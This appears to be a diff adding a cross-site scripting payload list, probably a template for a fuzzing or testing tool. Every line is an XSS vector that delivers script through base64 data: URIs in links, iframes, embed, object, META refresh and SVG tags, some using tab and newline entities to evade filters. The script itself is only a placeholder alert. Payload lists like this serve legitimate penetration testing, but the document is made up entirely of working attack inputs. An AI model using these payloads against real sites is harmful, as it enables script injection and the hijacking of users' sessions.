@@ -1,0 +1,16 @@
+<a href="data:text/html;base64,[B64]%3cscript%3ealert("PAYLOAD");history.back();%3c/script%3e"></a>[B64]
+<iframe src="data:text/html;base64,[B64]%3cscript%3ealert("PAYLOAD");history.back();%3c/script%3e"></[B64]
+0?<script>Worker("#").onmessage=function(_)eval(_.data)</script> :postMessage(importScripts('data:;base64,[B64]<script>alert("PAYLOAD");history.back();</script>[B64]'))
+<a href="data:application/x-x509-user-cert;&NewLine;base64&NewLine;,[B64]<script>alert("PAYLOAD");history.back();</script>[B64]"&#09;&#10;&#11;>Y</a
+<EMBED SRC="data:image/svg+xml;base64,[B64]<script>alert("PAYLOAD");history.back();</script>[B64]" type="image/svg+xml" AllowScriptAccess="always"></EMBED>
+<embed src="data:text/html;base64,[B64]<script>alert("PAYLOAD");history.back();</script>[B64]"></embed>
+<iframe/src="data:text/html;&Tab;base64&Tab;,[B64]<script>alert("PAYLOAD");history.back();</script>[B64]">
+<META HTTP-EQUIV="refresh" CONTENT="0;url=data:image/svg+xml; base64,[B64]<script>alert("PAYLOAD");history.back();</script>[B64]">
+"><META HTTP-EQUIV="refresh" CONTENT="0;url=data:image/svg+xml; base64,[B64]<script>alert("PAYLOAD");history.back();</script>[B64]">
+<META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html; base64,[B64]<script>alert("PAYLOAD");history.back();</script>[B64]">
+<META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html;base64,[B64]<script>alert("PAYLOAD");history.back();</script>[B64]">
+"><META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html; base64,[B64]<script>alert("PAYLOAD");history.back();</script>[B64]">
+<META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html base64,[B64]<script>alert("PAYLOAD");history.back();</script>[B64]">
+<object data="data:text/html;base64,[B64]<script>alert("PAYLOAD");history.back();</script>[B64]"></object>
+<object data=data:text/html;base64,[B64]<script>alert("PAYLOAD");history.back();</script>[B64]></object>​
+data:image/svg+xml;base64,[B64]<svg xmlns:svg="http://www.w3.org/2000/svg" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.0" x="0" y="0" width="194" height="200" id="Y"><script type="text/ecmascript">alert("PAYLOAD");</script></svg>[B64]
